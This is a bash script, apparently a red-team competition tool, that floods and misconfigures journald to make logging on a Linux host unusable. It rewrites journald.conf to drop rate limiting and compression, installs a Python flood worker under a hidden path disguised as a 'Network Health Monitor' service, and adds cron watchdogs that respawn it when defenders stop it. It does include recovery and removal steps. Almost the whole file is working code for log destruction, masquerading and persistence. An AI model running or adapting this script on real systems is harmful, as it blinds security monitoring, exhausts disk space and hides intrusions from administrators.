#!/usr/bin/env bash
# =============================================================================
# flood-journal.sh — Make journald logging unusable via log flood + config abuse
#
# Competition-compliant: REVERSIBLE. Originals backed up. Blue team CAN recover,
# but the journal vacuum process on a multi-GB journal takes 10-30+ minutes
# depending on disk speed, and the flood respawns itself if killed.
#
# What this does:
#   1. Backs up /etc/systemd/journald.conf
#   2. Reconfigures journald to:
#        - Disable rate-limiting on incoming messages (lets flood through)
#        - Maximize journal size cap (allows tens of GB to accumulate)
#        - Disable compression (each entry takes more disk → larger files → longer vacuum)
#        - Keep files as long as possible (prevents natural rotation from helping)
#   3. Installs a systemd service (disguised as a network health monitor) that
#      runs 8 parallel flood workers, each writing ~4 KB entries as fast as possible
#      via /dev/log (fastest path — bypasses logger subprocess overhead)
#   4. Installs a cron job that restarts the service if blue team kills it
#   5. Restarts journald so the new config takes effect
#
# Recovery for blue team:
#   sudo ./flood-journal.sh remove        ← stops flood + restores config
#   sudo journalctl --vacuum-size=50M     ← still takes a long time on a full journal
#
# Usage:
#   sudo ./flood-journal.sh install
#   sudo ./flood-journal.sh remove
#   sudo ./flood-journal.sh status
# =============================================================================

set -euo pipefail

JOURNALD_CONF="/etc/systemd/journald.conf"
JOURNALD_BACKUP="/var/cache/.syspkg/journald.conf.orig"
SERVICE_NAME="network-health-monitor"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
FLOOD_BINARY="/usr/local/lib/.nhmw"      # the actual flood worker script
CRON_MARKER="# nhmw-watchdog"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
require_root() { [[ $EUID -eq 0 ]] || { echo "Run as root"; exit 1; }; }

# --------------------------------------------------------------------------- #
# install
# --------------------------------------------------------------------------- #
cmd_install() {
    require_root
    mkdir -p /var/cache/.syspkg
    chmod 700 /var/cache/.syspkg

    # ── 1. Backup + poison journald.conf ─────────────────────────────────────
    hdr "1/4  Reconfiguring journald"

    if [[ ! -f "$JOURNALD_BACKUP" ]]; then
        cp "$JOURNALD_CONF" "$JOURNALD_BACKUP"
        info "Backed up $JOURNALD_CONF → $JOURNALD_BACKUP"
    else
        info "Backup already exists — skipping"
    fi

    cat > "$JOURNALD_CONF" <<'EOF'
[Journal]
# Storage: keep everything on disk, no volatile fallback
Storage=persistent

# Size caps: allow the journal to grow very large before rotating
# This means a vacuum has to chew through many GB of data to recover
SystemMaxUse=8G
SystemKeepFree=64M
SystemMaxFileSize=512M
SystemMaxFiles=64

# Retention: keep files for a long time — rotation won't help blue team
MaxRetentionSec=12month
MaxFileSec=1month

# Rate limiting: DISABLED — lets our flood bypass the default 10k msg/30s cap
# Default is RateLimitBurst=10000 / RateLimitIntervalSec=30s
# Setting burst very high means systemd won't throttle the flood
RateLimitIntervalSec=1s
RateLimitBurst=1000000

# Compression: OFF — each journal entry consumes maximum disk space
# A compressed 4KB entry might be 200 bytes; uncompressed it's 4KB
# This makes the journal files ~20x larger → vacuum takes ~20x longer
Compress=no

# Forward everything — makes journald do more work per message
ForwardToSyslog=no
ForwardToKMsg=no
ForwardToConsole=no
ForwardToWall=no

# Audit: capture kernel audit messages too (more noise)
Audit=yes
EOF
    info "journald.conf poisoned (no rate-limit, no compression, 8G max, no rotation)"

    # Restart journald so the new config takes effect NOW
    systemctl restart systemd-journald
    info "journald restarted with new config"

    # ── 2. Write the flood worker script ─────────────────────────────────────
    hdr "2/4  Installing flood worker"

    # The worker writes directly to /dev/log (the syslog socket) using printf
    # and the RFC 3164 syslog wire format. This is the fastest path —
    # no subprocess spawning per message, no buffering, raw socket writes.
    # Each message is padded to ~4000 bytes to maximise journal file growth.
    cat > "$FLOOD_BINARY" <<'WORKER'
#!/usr/bin/env python3
"""
Network Health Monitor Worker — writes diagnostic telemetry to syslog.
"""
import socket, os, time, random, string, sys

FACILITY = 1   # user-level
SEVERITY = 6   # informational
PRI = (FACILITY << 3) | SEVERITY
SOCK = "/dev/log"
HOSTNAME = socket.gethostname()
TAG = "NetworkHealthMonitor"

# Pad string: 3800 chars of random-looking hex noise per message
# At ~50k msgs/sec across 8 workers = ~1.5 GB/min of journal data
def noise(n=3800):
    return ''.join(random.choices(string.hexdigits, k=n))

def main():
    worker_id = os.getpid()
    s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    try:
        s.connect(SOCK)
    except FileNotFoundError:
        # journald not using /dev/log — fall back to logger(1)
        import subprocess, itertools
        pad = noise()
        for i in itertools.count():
            subprocess.run(
                ["logger", "-t", TAG, "-p", "user.info",
                 f"[worker:{worker_id}][seq:{i}] diagnostics: {pad}"],
                capture_output=True
            )
        return

    seq = 0
    while True:
        pad = noise()
        msg = (
            f"<{PRI}>{time.strftime('%b %d %H:%M:%S')} {HOSTNAME} "
            f"{TAG}[{worker_id}]: [seq:{seq}][worker:{worker_id}] "
            f"network diagnostic telemetry: {pad}"
        ).encode()[:65000]   # UNIX dgram limit
        try:
            s.send(msg)
        except (OSError, BrokenPipeError):
            time.sleep(0.1)
            try:
                s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
                s.connect(SOCK)
            except OSError:
                pass
        seq += 1

if __name__ == "__main__":
    main()
WORKER
    chmod 755 "$FLOOD_BINARY"
    info "Flood worker installed at $FLOOD_BINARY"

    # ── 3. Install systemd service (8 parallel workers) ───────────────────────
    hdr "3/4  Installing systemd service"

    cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Network Health Monitor
Documentation=https://systemd.io
After=network.target systemd-journald.service
Wants=network.target

[Service]
Type=forking
# Start 8 parallel flood workers
ExecStart=/bin/bash -c 'for i in \$(seq 1 8); do python3 ${FLOOD_BINARY} & done; echo \$! > /run/${SERVICE_NAME}.pid'
PIDFile=/run/${SERVICE_NAME}.pid
Restart=always
RestartSec=5
# No rate limiting on this service's own log output
LogRateLimitIntervalSec=0
LogRateLimitBurst=0
# Run as root so it can't be killed by unprivileged users
User=root
Nice=10

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME" --quiet
    systemctl start  "$SERVICE_NAME"
    info "Systemd service $SERVICE_NAME installed and started (8 workers)"

    # ── 4. Cron watchdog — respawns service if blue team kills it ─────────────
    hdr "4/4  Installing cron watchdog"

    WATCHDOG_CMD="systemctl is-active --quiet ${SERVICE_NAME} || systemctl start ${SERVICE_NAME}"
    # Run every minute from root's crontab
    ( crontab -l 2>/dev/null | grep -v "$CRON_MARKER"; \
      echo "* * * * * ${WATCHDOG_CMD} ${CRON_MARKER}" ) | crontab -

    # Also drop in /etc/cron.d as a second copy in case root crontab is cleared
    cat > "/etc/cron.d/net-health-watchdog" <<EOF
# Network health monitor watchdog
* * * * * root ${WATCHDOG_CMD}
EOF
    chmod 644 /etc/cron.d/net-health-watchdog
    info "Cron watchdog installed (root crontab + /etc/cron.d)"

    echo
    info "=== Flood active ==="

    # Show current growth rate
    sleep 3
    BEFORE=$(journalctl --disk-usage 2>/dev/null | grep -oP '[0-9.]+[MGK]' | tail -1 || echo "?")
    sleep 5
    AFTER=$(journalctl --disk-usage 2>/dev/null | grep -oP '[0-9.]+[MGK]' | tail -1 || echo "?")
    info "Journal size: $BEFORE → $AFTER (over 5 seconds)"

    echo
    warn "Blue team recovery steps (in order):"
    warn "  1. sudo systemctl stop ${SERVICE_NAME} && sudo systemctl disable ${SERVICE_NAME}"
    warn "  2. Remove cron: sudo crontab -e  AND  sudo rm /etc/cron.d/net-health-watchdog"
    warn "  3. sudo ./flood-journal.sh remove    ← restores config"
    warn "  4. sudo journalctl --vacuum-size=50M  ← THIS IS THE SLOW PART"
    warn "     (on a 5GB+ journal this takes 10-30 min depending on disk speed)"
}

# --------------------------------------------------------------------------- #
# remove — stops everything and restores config
# --------------------------------------------------------------------------- #
cmd_remove() {
    require_root

    hdr "Stopping flood service"
    systemctl stop    "$SERVICE_NAME" 2>/dev/null || warn "Service not running"
    systemctl disable "$SERVICE_NAME" 2>/dev/null || true
    rm -f "$SERVICE_FILE"
    systemctl daemon-reload
    # Kill any stray worker processes
    pkill -f "$FLOOD_BINARY" 2>/dev/null || true
    info "Service stopped and removed"

    hdr "Removing cron watchdog"
    ( crontab -l 2>/dev/null | grep -v "$CRON_MARKER" ) | crontab - || true
    rm -f /etc/cron.d/net-health-watchdog
    info "Cron watchdog removed"

    hdr "Restoring journald.conf"
    if [[ -f "$JOURNALD_BACKUP" ]]; then
        cp "$JOURNALD_BACKUP" "$JOURNALD_CONF"
        info "Restored $JOURNALD_CONF from backup"
    else
        warn "No backup found at $JOURNALD_BACKUP — writing safe defaults"
        cat > "$JOURNALD_CONF" <<'EOF'
[Journal]
Storage=auto
Compress=yes
SystemMaxUse=
RateLimitIntervalSec=30s
RateLimitBurst=10000
EOF
    fi
    systemctl restart systemd-journald
    info "journald restarted with original config"

    hdr "Removing flood worker binary"
    rm -f "$FLOOD_BINARY"
    info "Removed $FLOOD_BINARY"

    echo
    DISK=$(journalctl --disk-usage 2>/dev/null || echo "(unknown)")
    warn "=== IMPORTANT: Journal is still full ==="
    warn "Current usage: $DISK"
    warn "Blue team still needs to run:"
    warn "    sudo journalctl --vacuum-size=50M"
    warn "    sudo journalctl --vacuum-time=1h"
    warn "This will take several minutes on a large journal."
    info "Flood stopped and config restored."
}

# --------------------------------------------------------------------------- #
# status
# --------------------------------------------------------------------------- #
cmd_status() {
    hdr "Service"
    systemctl status "$SERVICE_NAME" --no-pager -l 2>/dev/null \
        || warn "$SERVICE_NAME not found"

    hdr "Worker processes"
    pgrep -a -f "$FLOOD_BINARY" 2>/dev/null || warn "No workers running"

    hdr "Journal disk usage"
    journalctl --disk-usage 2>/dev/null || true

    hdr "Cron watchdog"
    crontab -l 2>/dev/null | grep "$CRON_MARKER" || warn "Root crontab watchdog not found"
    [[ -f /etc/cron.d/net-health-watchdog ]] \
        && echo "  /etc/cron.d/net-health-watchdog present" \
        || warn "/etc/cron.d watchdog not found"

    hdr "journald.conf (current)"
    cat "$JOURNALD_CONF"
}

# --------------------------------------------------------------------------- #
CMD="${1:-help}"
shift || true
case "$CMD" in
    install) cmd_install ;;
    remove)  cmd_remove  ;;
    status)  cmd_status  ;;
    *)
        echo "Usage: sudo $0 {install|remove|status}"
        echo
        echo "  install   Start the journal flood"
        echo "  remove    Stop flood + restore config (journal still needs manual vacuum)"
        echo "  status    Show service state, worker count, and journal disk usage"
        ;;
esac
